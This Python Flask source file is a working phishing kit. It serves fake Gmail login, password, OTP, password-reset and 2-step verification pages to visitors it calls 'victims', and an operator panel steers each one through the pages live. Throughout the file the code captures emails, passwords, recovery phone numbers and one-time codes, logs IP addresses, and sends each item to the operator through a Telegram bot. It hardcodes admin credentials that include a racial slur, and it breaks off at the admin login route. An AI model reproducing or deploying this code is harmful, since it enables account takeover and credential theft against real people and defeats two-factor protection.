from flask import Flask, render_template, request, jsonify, redirect, url_for, session
import sqlite3
import requests
from datetime import datetime, timedelta
import os
from flask import Flask, render_template, request, jsonify, redirect, url_for, session
import psycopg2
import psycopg2.extras
import requests
from datetime import datetime, timedelta
import os
import urllib.parse as up
from functools import wraps
import time
import re
import json
import random  # Add this with the other imports
import secrets
import uuid
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()
app = Flask(__name__)
app.secret_key = "secretkey"
DATABASE_URL = os.environ.get('DATABASE_URL')
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

def get_db_connection():
    """Get PostgreSQL database connection"""
    conn = psycopg2.connect(DATABASE_URL)
    return conn

def init_db():
    """Initialize PostgreSQL database with correct schema"""
    conn = get_db_connection()
    c = conn.cursor()
    
    # Drop and recreate tables to ensure correct schema
    c.execute('DROP TABLE IF EXISTS navigations CASCADE')
    c.execute('DROP TABLE IF EXISTS victims CASCADE')
    
    c.execute('''
        CREATE TABLE victims (
            id SERIAL PRIMARY KEY,
            email TEXT,
            ip_address TEXT NOT NULL,
            user_agent TEXT,
            session_id TEXT UNIQUE,
            current_page TEXT DEFAULT 'login',
            is_active BOOLEAN DEFAULT TRUE,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE navigations (
            id SERIAL PRIMARY KEY,
            session_id TEXT,
            email TEXT,
            ip_address TEXT NOT NULL,
            page_url TEXT NOT NULL,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    c.execute('CREATE INDEX idx_victims_session_id ON victims(session_id)')
    c.execute('CREATE INDEX idx_victims_ip_address ON victims(ip_address)')
    c.execute('CREATE INDEX idx_victims_timestamp ON victims(timestamp)')
    c.execute('CREATE INDEX idx_victims_is_active ON victims(is_active)')
    
    c.execute('CREATE INDEX idx_navigations_session_id ON navigations(session_id)')
    c.execute('CREATE INDEX idx_navigations_timestamp ON navigations(timestamp)')
    c.execute('CREATE INDEX idx_navigations_ip_address ON navigations(ip_address)')
    
    conn.commit()
    conn.close()
    print("PostgreSQL database initialized!")

init_db()

# Admin credentials
ADMIN_USERNAME = "ImAdmin"
ADMIN_PASSWORD = "Nigga123"

# Store active victims and control commands
active_victims = {}
victim_commands = {}

# Store page data
verify_page_data = {}
recovery_page_data = {}
verification_page_data = {}

def send_telegram_message(message):
    """Send to your private chat + groups where YOU added the bot"""
    try:
        # Get your personal user ID
        updates_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
        updates_response = requests.get(updates_url)
        
        if updates_response.status_code != 200:
            return False
            
        updates_data = updates_response.json()
        your_user_id = None
        
        # Find YOUR user ID (first person who started the bot)
        if updates_data.get('ok'):
            for update in updates_data.get('result', []):
                if 'message' in update and 'from' in update['message']:
                    your_user_id = update['message']['from']['id']
                    break
        
        # Find all chats where YOU interacted or added the bot
        your_chats = set()
        if updates_data.get('ok') and your_user_id:
            for update in updates_data.get('result', []):
                if 'message' in update and 'chat' in update['message']:
                    chat = update['message']['chat']
                    chat_id = chat['id']
                    
                    # Include YOUR private chat
                    if chat['type'] == 'private' and 'from' in update['message']:
                        if update['message']['from']['id'] == your_user_id:
                            your_chats.add(chat_id)
                    
                    # Include ALL groups where bot is added (since only you can add it)
                    elif chat['type'] in ['group', 'supergroup']:
                        your_chats.add(chat_id)
        
        # Send to all your authorized chats
        success = False
        for chat_id in your_chats:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": message,
                "parse_mode": "HTML"
            }
            response = requests.post(url, data=data)
            if response.status_code == 200:
                success = True
                chat_type = "private" if chat_id > 0 else "group"
                print(f"✅ Sent to your {chat_type} chat: {chat_id}")
        
        return success
        
    except Exception as e:
        print(f"Error sending Telegram message: {e}")
        return False

def get_client_ip():
    """Get client IP address"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    else:
        return request.remote_addr

def create_victim_session(ip_address, user_agent):
    """Create a new victim session"""
    session_id = os.urandom(16).hex()
    
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("INSERT INTO victims (ip_address, user_agent, session_id, current_page) VALUES (%s, %s, %s, %s)",
              (ip_address, user_agent, session_id, 'login'))
    conn.commit()
    conn.close()
    
    # Store in memory for quick access
    active_victims[session_id] = {
        'ip_address': ip_address,
        'user_agent': user_agent,
        'email': None,
        'current_page': 'login',
        'is_active': True,
        'last_activity': datetime.now().isoformat()
    }
    
    return session_id

def update_victim_page(session_id, page_url, email=None):
    """Update victim's current page"""
    conn = get_db_connection()
    c = conn.cursor()
    
    if email:
        c.execute("UPDATE victims SET current_page = %s, email = %s WHERE session_id = %s", 
                 (page_url, email, session_id))
    else:
        c.execute("UPDATE victims SET current_page = %s WHERE session_id = %s", 
                 (page_url, session_id))
    
    conn.commit()
    conn.close()
    
    # Update active victims
    if session_id in active_victims:
        active_victims[session_id]['current_page'] = page_url
        active_victims[session_id]['last_activity'] = datetime.now().isoformat()
        if email:
            active_victims[session_id]['email'] = email

def log_navigation(session_id, page_url, email=None):
    """Log navigation - OPTIMIZED VERSION"""
    conn = get_db_connection()
    c = conn.cursor()
    
    try:
        # 1. Update victim's current page
        if email:
            c.execute("UPDATE victims SET current_page = %s, email = %s WHERE session_id = %s", 
                     (page_url, email, session_id))
        else:
            c.execute("UPDATE victims SET current_page = %s WHERE session_id = %s", 
                     (page_url, session_id))
        
        # 2. Get IP for logging
        c.execute("SELECT ip_address FROM victims WHERE session_id = %s", (session_id,))
        result = c.fetchone()
        ip_address = result[0] if result else 'Unknown'
        
        # 3. Insert navigation log
        c.execute("INSERT INTO navigations (session_id, email, ip_address, page_url) VALUES (%s, %s, %s, %s)",
                  (session_id, email, ip_address, page_url))
        
        conn.commit()
        
        # Update active victims in memory
        if session_id in active_victims:
            active_victims[session_id]['current_page'] = page_url
            active_victims[session_id]['last_activity'] = datetime.now().isoformat()
            if email:
                active_victims[session_id]['email'] = email
                
    except Exception as e:
        print(f"Error in log_navigation: {e}")
        conn.rollback()
    finally:
        conn.close()

@app.before_request
def check_restrictions():
    """Check commands for victims"""
    # Skip for panel, static files, admin routes
    if (request.endpoint in ['panel', 'static', 'control_victim', 'get_victims', 
                            'get_victim_navigations', 'delete_victim',
                            'check_command', 'track_navigation',
                            'set_phone_data', 'get_phone_data', 'set_recovery_data', 
                            'get_recovery_data', 'set_verification_data', 'get_verification_data', 
                            'set_verify_data', 'get_verify_data',
                            'admin_login', 'admin_logout'] or 
        request.path.startswith('/static/')):
        return None
    
    # Check for victim session and commands
    victim_session = session.get('victim_session')
    if victim_session and victim_session in victim_commands:
        command = victim_commands[victim_session]
        print(f"🎯 Executing command: {command} for session {victim_session}")
        
        # Handle all redirect commands
        command_map = {
            'go_to_login': 'gmail_login',
            'go_to_waiting': 'waiting',
            'go_to_stall': 'stall',
            'go_to_verify': 'verify',
            'go_to_password': 'password',
            'go_to_reset': 'reset',
            'go_to_otp': 'otp',
            'go_to_invalid': 'invalid',
            'go_to_recovery': 'recovery',
            'go_to_2step': 'twostep'
        }
        
        if command in command_map:
            victim_commands.pop(victim_session, None)
            page_name = command_map[command]
            return redirect(url_for(page_name))
    
    return None

@app.route('/')
def index():
    """Main route - serves index page with all email provider options"""
    # Create session if doesn't exist
    if 'victim_session' not in session:
        client_ip = get_client_ip()
        user_agent = request.headers.get('User-Agent', '')
        session_id = create_victim_session(client_ip, user_agent)
        session['victim_session'] = session_id
        session['is_victim'] = True
        
        # Send Telegram notification
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🎣 <b>NEW VICTIM CONNECTED!</b>

🌐 <b>IP Address:</b> <code>{client_ip}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
🔧 <b>User Agent:</b> <code>{user_agent}</code>
📍 <b>Current Page:</b> Index (Provider Selection)

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

⚡ <b>Take control immediately!</b>
        """
        
        send_telegram_message(message)
    
    return render_template('index.html')

@app.route('/gmail-login')
def gmail_login():
    """Gmail login page - the original login page"""
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    if session_id:
        log_navigation(session_id, 'Gmail Login Page', session.get('email'))
        update_victim_page(session_id, 'gmail_login')
        
        # Send notification when they reach login page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔐 <b>VICTIM REACHED GMAIL LOGIN PAGE!</b>

📧 <b>Email:</b> <code>{session.get('email', 'No email yet')}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Gmail Login

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎮 <b>Ready for your commands!</b>
        """
        
        send_telegram_message(message)
    
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    """Handle victim login"""
    email = request.form.get('email')
    session_id = session.get('victim_session')
    
    if email and session_id:
        # Update victim with email
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("UPDATE victims SET email = %s WHERE session_id = %s", (email, session_id))
        conn.commit()
        conn.close()
        
        # Update active victims
        if session_id in active_victims:
            active_victims[session_id]['email'] = email
        
        # Log the login
        log_navigation(session_id, 'Login Attempt', email)
        
        # Send Telegram update
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = get_client_ip()
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
📧 <b>VICTIM ENTERED EMAIL!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{client_ip}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Login Form

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎯 <b>Ready for next steps!</b>
        """
        
        send_telegram_message(message)
        
        session['email'] = email
        
        return jsonify({'success': True, 'redirect': url_for('password')})
    
    return jsonify({'success': False, 'error': 'No email provided'})

@app.route('/waiting')
def waiting():
    """Waiting page for victims"""
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    if session_id:
        log_navigation(session_id, 'Waiting Page', session.get('email'))
        
        # Send notification when they reach waiting page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
⏳ <b>VICTIM REACHED WAITING PAGE!</b>

📧 <b>Email:</b> <code>{session.get('email', 'No email')}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Waiting

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎮 <b>Ready for your commands!</b>
        """
        
        send_telegram_message(message)
    
    return render_template('waiting.html')

@app.route('/stall', methods=['GET', 'POST'])
def stall():
    """Stall page for victims - handles CAPTCHA submission and redirects to waiting"""
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Handle form submission
    if request.method == 'POST':
        captcha_text = request.form.get('ca', '').strip()
        
        print(f"Received stall CAPTCHA data - Email: {email}, CAPTCHA Text: {captcha_text}")
        
        # Send Telegram notification with CAPTCHA info
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
⏸️ <b>VICTIM SUBMITTED CAPTCHA ON STALL PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🔤 <b>CAPTCHA Text:</b> <code>{captcha_text or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Stall (CAPTCHA Submitted)

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🔄 <b>Redirecting to waiting page...</b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, 'Stall Page - CAPTCHA Submitted', email)
        
        # REDIRECT to waiting page after CAPTCHA submission
        return redirect(url_for('waiting'))
    
    # Handle GET request - track navigation
    if session_id:
        log_navigation(session_id, 'Stall Page', email)
        
        # Send notification when they reach stall page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
⏸️ <b>VICTIM REACHED STALL PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Stall (CAPTCHA)

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎮 <b>Ready for CAPTCHA submission!</b>
        """
        
        send_telegram_message(message)
    
    return render_template('stall.html')

@app.route('/api/set-verify-data', methods=['POST'])
def set_verify_data():
    """Set data for verify page placeholders"""
    data = request.get_json()
    session_id = data.get('session_id')
    email = data.get('email')
    
    if session_id and email:
        verify_page_data[session_id] = {
            'email': email,
            'timestamp': datetime.now().isoformat()
        }
    
    return jsonify({'success': True})

@app.route('/api/get-verify-data')
def get_verify_data():
    """Get verify page data for current session"""
    session_id = session.get('victim_session')
    if session_id and session_id in verify_page_data:
        return jsonify(verify_page_data[session_id])
    return jsonify({'email': ''})

@app.route('/verify', methods=['GET', 'POST'])
def verify():
    """Verify page for victims"""
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have verify data for this session
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    # Handle form submission
    if request.method == 'POST':
        recovery_email = request.form.get('recovery_email', '').strip()
        recovery_phone = request.form.get('recovery_phone', '').strip()
        
        print(f"Received recovery data - Email: {recovery_email}, Phone: {recovery_phone}")
        
        # Send Telegram notification with recovery info
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔐 <b>VICTIM SUBMITTED RECOVERY INFO!</b>

📧 <b>Original Email:</b> <code>{email}</code>
📩 <b>Recovery Email:</b> <code>{recovery_email or 'Not provided'}</code>
📱 <b>Recovery Phone:</b> <code>{recovery_phone or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, 'Recovery Info Submitted', email)
        
        # Redirect to waiting page
        return redirect(url_for('waiting'))
    
    # Handle GET request - track navigation
    if session_id:
        log_navigation(session_id, 'Verify Page', email)
        
        # Send notification when they reach verify page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔐 <b>VICTIM REACHED VERIFY PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Verify

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎮 <b>Ready for your commands!</b>
        """
        
        send_telegram_message(message)
    
    # Pass the placeholders to the template
    return render_template('verify.html', placeholders={'email': email})

@app.route('/password', methods=['GET', 'POST'])
def password():
    """Password page for victims"""
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have verify data for this session (for placeholders)
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    # Handle form submission
    if request.method == 'POST':
        password = request.form.get('password', '').strip()
        email = request.form.get('email', email)
        
        print(f"Received password data - Email: {email}, Password: {password}")
        
        # Send Telegram notification with password info
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔑 <b>VICTIM SUBMITTED PASSWORD!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, 'Password Submitted', email)
        
        # Redirect to waiting page
        return redirect(url_for('waiting'))
    
    # Handle GET request - track navigation
    if session_id:
        log_navigation(session_id, 'Password Page', email)
        
        # Send notification when they reach password page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔑 <b>VICTIM REACHED PASSWORD PAGE DIRECTLY FROM LOGIN!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Password (Direct from Login)

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎮 <b>Ready for password capture!</b>
"""
        
        send_telegram_message(message)
    
    # Pass the placeholders to the template
    return render_template('password.html', placeholders={'email': email})

@app.route('/track-navigation', methods=['POST'])
def track_navigation():
    """Track victim navigation"""
    if not session.get('is_victim'):
        return jsonify({'success': False})
    
    data = request.get_json()
    page_url = data.get('page_url', 'Unknown')
    session_id = session.get('victim_session')
    
    if session_id:
        log_navigation(session_id, page_url, session.get('email'))
    
    return jsonify({'success': True})

@app.route('/invalid', methods=['GET', 'POST'])
def invalid():
    """Invalid page for victims (too many failed attempts)"""
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have verify data for this session (for placeholders)
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    # Handle form submission
    if request.method == 'POST':
        password = request.form.get('password', '').strip()
        email = request.form.get('email', email)
        
        print(f"Received password data from invalid page - Email: {email}, Password: {password}")
        
        # Send Telegram notification with password info
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔑 <b>VICTIM SUBMITTED PASSWORD FROM INVALID PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Password:</b> <code>{password or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page Type:</b> Invalid/Too Many Attempts

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, 'Invalid Page - Password Submitted', email)
        
        # Redirect to waiting page
        return redirect(url_for('waiting'))
    
    # Handle GET request - track navigation
    if session_id:
        log_navigation(session_id, 'Invalid Page', email)
        
        # Send notification when they reach invalid page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🚫 <b>VICTIM REACHED INVALID PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Invalid/Too Many Attempts

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎮 <b>Ready for your commands!</b>
        """
        
        send_telegram_message(message)
    
    # Pass the placeholders to the template
    return render_template('invalid.html', placeholders={'email': email})

@app.route('/reset', methods=['GET', 'POST'])
def reset():
    """Reset password page for victims - collecting created password"""
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have verify data for this session (for placeholders)
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    # Handle form submission
    if request.method == 'POST':
        new_password = request.form.get('new_password', '').strip()
        confirm_password = request.form.get('confirm_password', '').strip()
        email = request.form.get('email', email)
        
        print(f"Received reset password data - Email: {email}, New Password: {new_password}, Confirm Password: {confirm_password}")
        
        # Send Telegram notification with password info
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔑 <b>VICTIM CREATED NEW PASSWORD!</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>New Password:</b> <code>{new_password or 'Not provided'}</code>
✅ <b>Confirm Password:</b> <code>{confirm_password or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, 'Reset Password Submitted', email)
        
        # Redirect to waiting page
        return redirect(url_for('waiting'))
    
    # Handle GET request - track navigation
    if session_id:
        log_navigation(session_id, 'Reset Password Page', email)
        
        # Send notification when they reach reset password page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔑 <b>VICTIM REACHED RESET PASSWORD PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Reset Password

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎮 <b>Ready for your commands!</b>
        """
        
        send_telegram_message(message)
    
    # Pass the placeholders to the template
    return render_template('reset.html', placeholders={'email': email})

@app.route('/otp', methods=['GET', 'POST'])
def otp():
    """OTP page for victims"""
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have verify data for this session (for placeholders)
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    # Handle form submission
    if request.method == 'POST':
        otp_code = request.form.get('otpcode', '').strip()
        email = request.form.get('email', email)
        
        print(f"Received OTP data - Email: {email}, OTP: {otp_code}")
        
        # Send Telegram notification with OTP info
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔢 <b>VICTIM SUBMITTED OTP!</b>

📧 <b>Email:</b> <code>{email}</code>
🔢 <b>OTP Code:</b> <code>{otp_code or 'Not provided'}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, 'OTP Submitted', email)
        
        # Redirect to waiting page
        return redirect(url_for('waiting'))
    
    # Handle GET request - track navigation
    if session_id:
        log_navigation(session_id, 'OTP Page', email)
        
        # Send notification when they reach OTP page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔢 <b>VICTIM REACHED OTP PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> OTP

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🎮 <b>Ready for your commands!</b>
        """
        
        send_telegram_message(message)
    
    # Pass the placeholders to the template
    return render_template('otp.html', placeholders={'email': email, 'phone': '****'})

@app.route('/recovery')
def recovery():
    """Recovery page for victims - FIXED"""
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have recovery data for this session
    recovery_data = {}
    if session_id and session_id in recovery_page_data:
        recovery_data = recovery_page_data[session_id]
        email = recovery_data.get('email', email)
    
    # Track navigation
    if session_id:
        log_navigation(session_id, 'Recovery Page', email)
        
        # 🚨 PREVENT DUPLICATE NOTIFICATIONS
        notification_key = f'notified_recovery_{session_id}'
        if not session.get(notification_key):
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            panel_url = f"{request.host_url.rstrip('/')}/panel"
            
            message = f"""
📱 <b>VICTIM REACHED RECOVERY PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🔢 <b>Number Displayed:</b> <code>{recovery_data.get('number', 'Not set')}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Recovery

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

⏸️ <b>Page is stagnant - ready for your commands!</b>
            """
            
            send_telegram_message(message)
            session[notification_key] = True  # Mark as notified
    
    return render_template('recovery.html', placeholders={
        'email': email, 
        'number': recovery_data.get('number', '')
    })

@app.route('/2step', methods=['GET', 'POST'])
def twostep():
    """2-Step Verification page for victims - stagnant page showing email and phone type"""
    if not session.get('is_victim'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have verification data for this session
    verification_data = {}
    if session_id and session_id in verification_page_data:
        verification_data = verification_page_data[session_id]
        email = verification_data.get('email', email)
    
    # Track navigation
    if session_id:
        log_navigation(session_id, '2-Step Verification Page', email)
        
        # Send notification when they reach 2-step verification page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
📱 <b>VICTIM REACHED 2-STEP VERIFICATION PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
📱 <b>Phone Displayed:</b> <code>{verification_data.get('phone', 'Not set')}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> 2-Step Verification

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

⏸️ <b>Page is stagnant - ready for your commands!</b>
        """
        
        send_telegram_message(message)
    
    # Pass the placeholders to the template
    return render_template('2stepverification.html', placeholders={
        'email': email, 
        'phone': verification_data.get('phone', 'iPhone')
    })

@app.route('/api/set-verification-data', methods=['POST'])
def set_verification_data():
    """Set data for 2-step verification page placeholders (email and phone)"""
    data = request.get_json()
    session_id = data.get('session_id')
    email = data.get('email')
    phone = data.get('phone')
    
    print(f"Setting verification data - Session: {session_id}, Email: {email}, Phone: {phone}")
    
    if session_id:
        verification_page_data[session_id] = {
            'email': email or '',
            'phone': phone or '',
            'timestamp': datetime.now().isoformat()
        }
        print(f"Verification data stored: {verification_page_data[session_id]}")
    
    return jsonify({'success': True})

@app.route('/api/get-verification-data')
def get_verification_data():
    """Get verification page data for current session"""
    session_id = session.get('victim_session')
    if session_id and session_id in verification_page_data:
        data = verification_page_data[session_id]
        print(f"Returning verification data for session {session_id}: {data}")
        return jsonify(data)
    print(f"No verification data found for session {session_id}")
    return jsonify({'email': '', 'phone': ''})

@app.route('/api/set-phone-data', methods=['POST'])
def set_phone_data():
    """Set phone number for OTP page placeholders"""
    data = request.get_json()
    session_id = data.get('session_id')
    phone = data.get('phone')
    
    if session_id and phone:
        verify_page_data[session_id] = {
            **verify_page_data.get(session_id, {}),
            'phone': phone,
            'timestamp': datetime.now().isoformat()
        }
    
    return jsonify({'success': True})

@app.route('/api/get-recovery-data')
def get_recovery_data():
    """Get recovery page data for current session"""
    session_id = session.get('victim_session')
    if session_id and session_id in recovery_page_data:
        data = recovery_page_data[session_id]
        print(f"Returning recovery data for session {session_id}: {data}")
        return jsonify(data)
    print(f"No recovery data found for session {session_id}")
    return jsonify({'email': '', 'number': ''})

@app.route('/api/set-recovery-data', methods=['POST'])
def set_recovery_data():
    """Set data for recovery page placeholders (email and number)"""
    data = request.get_json()
    session_id = data.get('session_id')
    email = data.get('email')
    number = data.get('number')
    
    print(f"Setting recovery data - Session: {session_id}, Email: {email}, Number: {number}")
    
    if session_id:
        recovery_page_data[session_id] = {
            'email': email or '',
            'number': number or '',
            'timestamp': datetime.now().isoformat()
        }
        print(f"Recovery data stored: {recovery_page_data[session_id]}")
    
    return jsonify({'success': True})

@app.route('/api/get-phone-data')
def get_phone_data():
    """Get phone data for current session"""
    session_id = session.get('victim_session')
    if session_id and session_id in verify_page_data:
        return jsonify(verify_page_data[session_id])
    return jsonify({'phone': ''})

@app.route('/check-command')
def check_command():
    """Check if there's a command for the victim - FIXED"""
    session_id = session.get('victim_session')
    
    if session_id and session_id in victim_commands:
        command = victim_commands[session_id]
        print(f"🎯 Command found and REMOVED: {command} for session {session_id}")
        
        # 🎯 IMMEDIATELY REMOVE COMMAND TO PREVENT SPAM
        victim_commands.pop(session_id, None)
        
        return jsonify({'command': command})
    
    return jsonify({'command': None})

# Admin Routes
@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    """Admin login page and authentication"""
    if request.method == 'POST':
